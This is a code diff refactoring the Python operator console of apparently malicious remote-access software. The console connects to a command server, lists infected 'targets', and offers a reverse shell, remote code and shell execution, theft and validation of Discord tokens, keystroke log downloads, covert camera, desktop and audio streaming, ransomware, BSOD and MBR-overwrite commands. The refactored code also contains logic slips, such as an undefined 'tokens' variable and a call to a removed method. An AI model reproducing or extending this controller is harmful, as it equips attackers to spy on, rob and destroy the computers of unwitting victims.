@@ -1,4 +1,4 @@
-import multiprocessing, threading, requests, base64, json, time, glob, cv2, ssl, os, io
+import multiprocessing, threading, websocket, requests, asyncio, base64, json, time, glob, cv2, ssl, os, io
 from websocket import create_connection
 from playsound import playsound
 from PIL import Image, ImageTk
@@ -32,8 +32,10 @@ class Main:
       self.uiprint('Enter your server key')
       self.key = input('> ')
 
+      self.clear()
+
       threading.Thread(target=self.connect).start()
-      threading.Thread(target=self.getInput).start()
+      self.main()
 
     def clear(self):
         if os.name == "nt":
@@ -67,14 +69,14 @@ class Main:
                 ws = self.ws
                 ws.send(self.key)
 
-    def gettokens(self):
+    def get_tokens(self):
         tokens = requests.get(f'https://{self.host}/tokens', data={'key': self.key}).json()
         return tokens
 
     def check(self, token):
         return requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': token}).status_code == 200
 
-    def sendCommand(self, command, target, type=None):
+    def send_command(self, command, target, type=None):
         if type == "cmd":
             command = f'''import subprocess\nsubprocess.call("""{command}""", shell=True)'''
 
@@ -83,16 +85,14 @@ class Main:
             "target": target
         }))
 
-    def showComputers(self, Input=True):
+    def get_input(self, choose=True):
         uiprint = self.uiprint
         uiprint("Choose a target:")
         print("", end="\n\n")
 
         if not self.computers:
             uiprint("No available targets.", "error")
-            time.sleep(2.5)
-            self.clear()
-            self.getInput()
+            return
 
         for count, target in enumerate(self.computers):
             print(f"{self.indent}[", end="")
@@ -100,12 +100,11 @@ class Main:
             print("] ", end="")
             print(target, end="\n\n")
 
-        if Input:
+        if choose:
             while True:
                 try:
                     choice = int(input(f"{self.indent}>>"))
-                    self.target = self.computers[choice-1]
-                    break
+                    return self.computers[choice - 1]
                 except:
                   uiprint("Invalid option!", "error")
 
@@ -114,9 +113,9 @@ class Main:
             input(f"{self.indent}>>")
 
     class ReverseShell:
-        def __init__(self, computer, ctx):
-            self.key = ctx.key
-            self.host = ctx.host
+        def __init__(self, computer, host, key):
+            self.key = key
+            self.host = host
             self.computer = computer
             self.ws = self.establishConnection()
             self.start()
@@ -135,17 +134,22 @@ class Main:
 
                 ws.send(command)
 
-                while True:
-                    recv = ws.recv()
+                timer = threading.Timer(15., ws.close)
+                timer.start()
 
-                    
-                    if recv == '%:!:^':
-                        break
+                try:
+                    print(ws.recv())
+                    timer.cancel()
+                except KeyboardInterrupt:
+                    break
 
-                    print(recv[:-2], end=recv[-2:])
+                except websocket._exceptions.WebSocketConnectionClosedException:
+                    pass
 
-                    
-            
+                if not timer.is_alive:
+                    self.ws = self.establishConnection()
+                    ws = self.ws
+                    print("[SepticX Handler]: Timeour Error Occured")
 
         def establishConnection(self):
             ws = create_connection(f'wss://{self.host}/api/ws/readShell', sslopt={"cert_reqs": ssl.CERT_NONE})
@@ -154,9 +158,9 @@ class Main:
             return ws
 
     class Audio:
-        def __init__(self, target, ctx):
-            self.key = ctx.key
-            self.host = ctx.host
+        def __init__(self, target, host, key):
+            self.key = key
+            self.host = host
             self.Stop = False
             self.target = target
             if os.path.exists("/sounds"):
@@ -241,9 +245,9 @@ class Main:
             self.Stop = True
 
     class Video:
-        def __init__(self, target, option, ctx):
-            self.key = ctx.key
-            self.host = ctx.host
+        def __init__(self, target, option, host, key):
+            self.key = key
+            self.host = host
             self.Stop = False
             self.display(target, option)
 
@@ -299,18 +303,34 @@ class Main:
         def stop(self):
             self.Stop = True
 
-    def getInput(self):
+    def main(self):
         uiprint = self.uiprint
         columns = self.columns
         length = 15
+
         options = [
-            "Reverse Shell", "Run PY file", "Get Discord Tokens", 
+            "Reverse Shell", "Run PY file", "Resend Credentials", 
             "Nuke Discord Tokens", "Update Discord Webhook", "Stream Camera", 
-            "Stream Desktop", "Stop Streaming Camera", "Stop Streaming Desktop", 
-            "Stream Audio", "Stop Streaming Audio", "Restart Pc", 
+            "Stream Desktop","Stream Audio", "Stop Streaming Camera",
+            "Stop Streaming Desktop", "Stop Streaming Audio", "Restart Pc", 
             "Start Ransomware", "Start Trollware", "Stop Trollware", 
-            "Start BSOD", "Overwrite MBR", "Shutdown Pc", "Logged Tokens", "Logged Keystrokes", "Show Targets"]
-        print("""
+            "Start BSOD", "Overwrite MBR", "Shutdown Pc", 
+            "Logged Tokens", "Logged Keystrokes", "Show Targets"
+        ]
+
+        commands = [
+            None, None, "sendCreds", 
+            "nukeTokens", "updateWebhook:", "streamCamera", 
+            "streamDesktop", "streamAudio", "stopDesktop", 
+            "stopCamera", "stopAudio", "restart", 
+            "startRansomware", "Troll", "stopTroll",
+            "bsod", "mbr", "shutdown", 
+            None, None, None
+        ]
+
+        while True:
+
+            print("""
                   
                                                                                                   
                         ██████╗  █████╗ ███████╗██╗  ██╗██████╗  ██████╗  █████╗ ██████╗ ██████╗     
@@ -324,189 +344,140 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
 ========================================================================================================================
                                       """.replace("║", f"{colors.GREEN}║{colors.RESET}").replace("╗", f"{colors.GREEN}╗{colors.RESET}").replace("╚", f"{colors.GREEN}╚{colors.RESET}").replace("╝", f"{colors.GREEN}╝{colors.RESET}").replace("═", f"{colors.GREEN}═{colors.RESET}").replace("╔", f"{colors.GREEN}╔{colors.RESET}").replace("|", f"{colors.GREEN}|{colors.RESET}"))
 
-        for count, option in enumerate(options):
-            # print(count+1, ((count+1) % 3))
-            if (count % columns) == 0:
-                print(f"{self.indent}[", end="")
-                cprint(str(count+1), "green", end="")
-                print("] ", end="")
-                print(option, end="")
+            for count, option in enumerate(options):
 
-            else:
-                base = len(options[0])
-                space = self.seperate - (( len(options[count - 1]) + len(str(count))-1)-base)
-                if not count == 0:
-                    for _ in range(space):
-                      print(" ", end="")
+                if (count % columns) == 0:
+                    print(f"{self.indent}[", end="")
+                    cprint(str(count +1 ), "green", end="")
+                    print("] ", end="")
+                    print(option, end="")
+
                 else:
-                      print("        ", end="")
-                print("[", end="")
-                cprint(str(count+1), "green", end="")
-                print("] ", end="")
-                print(option, end="")
+                    base = len(options[0])
+                    space = self.seperate - ( ( len(options[count - 1]) + len(str(count) ) - 1) - base)
 
-            if (count % columns) == columns-1:
-                print("\n")
-            
-        print("\n\n\n", end="")
+                    if not count == 0:
+                        print(" " * space, end="")
+                    else:
+                        print("        ", end="")
 
-        while True:
+                    print("[", end="")
+                    cprint(str(count+1), "green", end="")
+                    print("] ", end="")
+                    print(option, end="")
+
+                if (count % columns) == columns - 1:
+                    print("\n")
+                
+            print("\n\n\n", end="")
+
             try:
                 choice = int(input(f"{self.indent}>>"))
-                break
-            except KeyboardInterrupt:
+            except (KeyboardInterrupt, EOFError):
                 uiprint("Exiting...")
                 time.sleep(1)
                 os._exit(0)
-            except EOFError:
-                uiprint("Exiting...")
-                time.sleep(1)
-                os._exit(0)
+
             except:
                 uiprint("Invalid option!", "error")
-                time.sleep(1.5)
+                continue
+
+            if choice == 19:
+                if not tokens:
+                    self.uiprint('No available tokens.', 'error')
+                    self.clear()
+                    self.getInput()
+
+                for token in tokens:
+                    print(f"Token: {token}")
+                
+                if not self.check(token):
+                    uiprint('Invalid Token', 'error')
+                else:
+                    uiprint('Valid Token!')
+
+                input(">> Press enter to continue")
+                continue
+
+            elif choice == 20:
+                uiprint('Downloading logs...')
+                download = requests.get(f'https://{self.host}/logs', data={'key': self.key}).content
+                with open('logs.zip', 'wb') as file:
+                    file.write(download)
+
+                uiprint("Downloaded logs are in 'logs.zip'")
+                continue
+
+            elif choice == 21:
+                self.get_input(choose=False)
+                continue
+
+            target = self.get_input()
+            command = commands[choice - 1]
+
+            if not target:
+                time.sleep(1)
                 self.clear()
-                self.getInput()
+                continue
 
-
-        if choice == 1:
-            self.showComputers()
-            try:
-                self.ReverseShell(self.target, self)
-            except KeyboardInterrupt():
-                pass
-
-
-        elif choice == 2:
-            while True:
+            if choice == 1:
                 try:
-                    uiprint("Type the filename below:")
-                    filename = input(f"{self.indent}>>")
-                    command = open(filename, "r+")
-                    break
-                except:
-                  uiprint("Invalid filename!", "error")
-
-            self.showComputers()
-            self.sendCommand(command, self.target)
-            uiprint("Sent!")
-            time.sleep(1.2)
-
-
-        elif choice == 3:
-            self.showComputers()
-            self.sendCommand("sendTokens", self.target)
-
-        elif choice == 4:
-            self.showComputers()
-            self.sendCommand("nukeTokens", self.target)
-
-        elif choice == 5:
-            uiprint("Enter your webhook below:")
-            print("", end="\n\n")
-            webhook = input(f"{self.indent}>>")
-            self.showComputers()
-            self.sendCommand(f"updateWebhook:{webhook}", self.target)
-
-        elif choice == 6:
-            self.showComputers()
-            self.sendCommand("streamCamera", self.target)
-            try:
-                threading.Thread(target=self.Video, args=(self.target, 0, self)).start()
-            except:
-                pass
-
-        elif choice == 7:
-            self.showComputers()
-            self.sendCommand("streamDesktop", self.target)
-            try:
-                threading.Thread(target=self.Video, args=(self.target, 1, self)).start()
-            except:
-                pass
-
-        elif choice == 8:
-            self.showComputers()
-            self.sendCommand("stopDesktop", self.target)
-
-        elif choice == 9:
-            self.showComputers()
-            self.sendCommand("stopCamera", self.target)
-
-        elif choice == 10:
-            self.showComputers()
-            self.sendCommand("streamAudio", self.target)
-            try:
-                threading.Thread(target=self.Audio, args=(self.target, self)).start()
-            except Exception as e:
-                pass
-
-        elif choice == 11:
-            self.showComputers()
-            self.sendCommand("stopAudio", self.target)
-
-        elif choice == 12:
-            self.showComputers()
-            self.sendCommand("restart", self.target)
-
-        elif choice == 13:
-            self.showComputers()
-            self.sendCommand("startRansomware", self.target)
-
-        elif choice == 14:
-            self.showComputers()
-            self.sendCommand("Troll", self.target)
-
-        elif choice == 15:
-            self.showComputers()
-            self.sendCommand("stopTroll", self.target)
-
-        elif choice == 16:
-            self.showComputers()
-            self.sendCommand("bsod", self.target)
-
-        elif choice == 17:
-            self.showComputers()
-            self.sendCommand("mbr", self.target)
-
-        elif choice == 18:
-            self.showComputers()
-            self.sendCommand("shutdown", self.target)
-
-        elif choice == 19:
-            tokens = self.gettokens()
-            if not tokens:
-                self.uiprint('No available tokens.', 'error')
-                time.sleep(1.5)
+                    self.ReverseShell(target, self.host, self.key)
+                except KeyboardInterrupt:
+                    pass
+                
                 self.clear()
-                self.getInput()
+                continue
 
-            for token in tokens:
-                print(f"Token: {token}")
-            
-            if not self.check(token):
-                uiprint('Invalid Token', 'error')
-            else:
-                uiprint('Valid Token!')
+            elif choice == 2:
+                while True:
+                    try:
+                        uiprint("Type the filename below:")
+                        filename = input(f"{self.indent}>>")
+                        command = open(filename, "r+")
+                        break
+                    except KeyboardInterrupt:
+                        break
 
-            time.sleep(1.5)
+                    except:
+                        uiprint("Invalid filename!", "error")
 
-        elif choice == 20:
-            uiprint('Downloading logs...')
-            download = requests.get(f'https://{self.host}/logs', data={'key': self.key}).content
-            with open('logs.zip', 'wb') as file:
-                file.write(download)
+                        self.send_command(command, target)
+                        uiprint("Sent!")
+                        time.sleep(1.2)
 
-            uiprint("Downloaded logs are in 'logs.zip'")
-            time.sleep(1.5)
+            elif choice == 5:
+                uiprint("Enter your webhook below:")
+                print("", end="\n\n")
+                webhook = input(f"{self.indent}>>")
+                command = f"updateWebhook:{webhook}"
+                self.send_command(command, target)
+
+            elif choice == 6:
+                try:
+                    threading.Thread(target=self.Video, args=(self.target, 0, self.host, self.key)).start()
+                except:
+                    pass
+
+            elif choice == 7:
+                try:
+                    threading.Thread(target=self.Video, args=(self.target, 1, self.host, self.key)).start()
+                except:
+                    pass
+
+            elif choice == 8:
+                try:
+                    threading.Thread(target=self.Audio, args=(self.target, self.host, self.key)).start()
+                except Exception as e:
+                    pass
+
+            if command:
+                self.send_command(command, target)
+                uiprint('Command Sent!')
 
 
-
-        elif choice == 21:
-            self.showComputers(False)
-
-        self.clear()
-        self.getInput()
-
+            time.sleep(1)
+            self.clear()
 
 if __name__ == '__main__':
     Main()
